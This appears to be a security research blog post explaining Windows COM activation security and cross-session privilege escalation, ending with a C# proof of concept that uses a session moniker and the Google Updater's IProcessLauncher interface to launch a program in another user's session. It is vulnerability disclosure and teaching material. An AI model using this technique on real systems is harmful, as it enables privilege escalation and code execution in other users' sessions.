---
title: COM Cross-Session Activation
url: https://blog.compass-security.com/2024/10/com-cross-session-activation/
source: Over Security - Cybersecurity news aggregator
date: 2024-10-02
fetch_date: 2025-10-06T18:57:08.607377
---

# COM Cross-Session Activation

## [Compass Security Blog](https://blog.compass-security.com "Compass Security Blog — Offensive Defense")

### Offensive Defense

* [Home](https://blog.compass-security.com/)
* [Archive](https://blog.compass-security.com/archive/)
* [Contact](https://blog.compass-security.com/contact/)
* [Newsletter](https://blog.compass-security.com/mailing-list-tigerinfo/)

* [Home](https://blog.compass-security.com/)
* [Archive](https://blog.compass-security.com/archive/)
* [Contact](https://blog.compass-security.com/contact/)
* [Newsletter](https://blog.compass-security.com/mailing-list-tigerinfo/)

# [COM Cross-Session Activation](https://blog.compass-security.com/2024/10/com-cross-session-activation/ "COM Cross-Session Activation")

[October 1, 2024](https://blog.compass-security.com/2024/10/com-cross-session-activation/ "COM Cross-Session Activation")
 /
[Sylvain Heiniger](https://blog.compass-security.com/author/sheinige/ "Posts by Sylvain Heiniger")
 /
[0 Comments](https://blog.compass-security.com/2024/10/com-cross-session-activation/#respond)

Once again, reading blogs and tweets from James Forshaw led me to wonder how things work. This time, I was working on DCOM for my [last blog post](https://blog.compass-security.com/2024/09/three-headed-potato-dog/) and while reading about cross-session activation, I had trouble believing what I was reading.

Let’s start with the basics.

## COM 101

The **Microsoft Component Object Model (COM)** defines an interoperability standard for creating reusable software libraries that interact at run time.

Imagine you wrote software that needs updating. For this to be able to work in the user context, you install a service, let it run as SYSTEM. Your userland software will be able to use COM to communicate with the service in order to update your software as SYSTEM.

A **COM class** is the implementation of a group of interfaces executed when client interact with a given object. It is identified by a **CLSID**: a unique 128-bit GUID, registered by the server.

Your service (COM server) [registers](https://learn.microsoft.com/en-us/windows/win32/com/registering-com-servers) a COM class “Software Updater”, with CLSID `c3ac910b-b039-1500-b33f-5cd7327fe6da`. When your software (COM client) wants to update, it creates an instance of the class to communicate with the interface.

A **COM interface** defines the methods available through the COM class.

In our example, the only method defined is the `UpdateFromCmdLine` method which takes a command (string `cmd_line`) as input.

```
[
  object,
  oleautomation,
  uuid(c3ac910b-b039-1500-b33f-5cd7327fe6da),
  helpstring("Software Updater Interface"),
]
interface ISoftwareUpdater: IUnknown {
  // @param cmd_line The full command line to execute.
  HRESULT UpdateFromCmdLine([in, string] const WCHAR* cmd_line);
};
```

## COM Security

COM defines a so-called **activation security**. This specifies who is allowed to activate (or launch) what. This is stored in the registry and evaluated by the service control manager (SCM).

Several values affect COM applications:

* **Launch and Activation permissions**: set who can instantiate and interact with COM class objects
* **Authentication Level**, **Delegation rights** and **Impersonation rights** are important when two servers communicate (on behalf of a client) (and for relaying)
* **Application identity**: sets the identities the application can use. That can be:
  + The interactive user (a logged-in user, in an interactive session)
  + The launching user (the user which instantiated the COM class)
  + This user … (a user defined by the server)
  + The system account (NT AUTHORITY/SYSTEM)
* **Software Restriction Policy**: can restrict code allowed to run

These settings can be found using the registry under `HKEY_LOCAL_MACHINE\SOFTWARE\Classes\AppID\{AppID_GUID}\` or using the built-in `dcomcnfg.exe` tool.

### Cross-Session Activation

If the application identity is set to “The interactive user”, one can use a so-called “session moniker” to activate a COM class in any interactive session on the machine.

## Cross-Session Elevation of Privilege

To recapitulate the above, a COM class may be abused for Cross-Session privilege escalation if:

* The ACL of the COM object allows the user to launch and activate it
* The application identity is set to “interactive user”
* The interface allows to execute code (or do something useful in the context of the victim)

### Finding Bugs

For finding COM classes vulnerable to cross-session elevation of privilege (EoP), I can recommend [OleViewDotNet](https://github.com/tyranid/oleviewdotnet), from James Forshaw and the accompanying [blog post](https://www.tiraniddo.dev/2018/09/finding-interactive-user-com-objects_9.html).

### Known Bugs

This class of bugs has been around for a long time, however, I was only able to find a few CVEs:

* CVE-2017-0100:
  + COM Class: HxHelpPaneServer
* CVE-2019-0566:
  + COM Class: Browser Broker
* CVE-2021-23874
  + COM Classes: McAfee CoManageOem and ManageOem
* CVE-2023-33127:
  + COM Class: PhoneExperienceHost
    Race condition and code execution through named pipe

## **Chrome Updater EoP**

While researching the topic, I stumbled upon an interface called `IProcessLauncher`. The Type Library for the class was present and showed a method `LaunchCmdLine`.

After searching on the Internet for this, I found the source code, in the [chromium project](https://chromium.googlesource.com/chromium/src/%2B/HEAD/google_update/google_update_idl.idl) (which is based on [Omaha](https://github.com/google/omaha/)):

[![](https://blog.compass-security.com/wp-content/uploads/2024/09/image-4.png)](https://blog.compass-security.com/wp-content/uploads/2024/09/image-4.png)

google\_update\_idl.idl

The associated COM class did not show up in OleViewDotNet, but in the registry, one can find it is related to the Google Update Service:

[![](https://blog.compass-security.com/wp-content/uploads/2024/09/image.png)](https://blog.compass-security.com/wp-content/uploads/2024/09/image.png)

The application runs with the default Launch and Activation Permissions:

[![](https://blog.compass-security.com/wp-content/uploads/2024/09/image-1.png)](https://blog.compass-security.com/wp-content/uploads/2024/09/image-1.png)

As it runs as a service, the SYSTEM account is used:

[![](https://blog.compass-security.com/wp-content/uploads/2024/09/image-2.png)](https://blog.compass-security.com/wp-content/uploads/2024/09/image-2.png)

Although Microsoft says Cross-Session activation works only with “The interactive user”, this seems to work as well with “The system account”.

### The Exploit

It is pretty easy to test if this class can be instantiated in the context of another user. The following code (inspired, again from [James Forshaw](https://project-zero.issues.chromium.org/issues/42450026)) is all it needs:

```
namespace SessionMoniker
{
    class Program
    {
	// Defines the interface
        [ComImport, Guid("128C2DA6-2BC0-44C0-B3F6-4EC22E647964"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
        interface IProcessLauncher
        {
            void LaunchCmdLine(string cmd_line);
            void LaunchBrowser(uint browser_type, string url);
            Int32 LaunchCmdElevated(string app_guid, string cmd_id, uint caller_proc_id);
            UInt32 LaunchCmdLineEx(string cmd_line);
        }

	  // ...

	static void Main(string[] args)
        {
            try
            {
		// Sets the session to execute code into
                int session_id = 2;
		// Instantiate the object in the session
                IProcessLauncher server = (IProcessLauncher)Marshal.BindToMoniker(
                    String.Format(
                        "session:{0}!new:ABC01078-F197-4B0B-ADBC-CFE684B39C82",
                         session_id
                    )
                );
		// Use the interface to execute code
                server.LaunchCmdLine("c:\\windows\\system32\\calc.exe");
            ...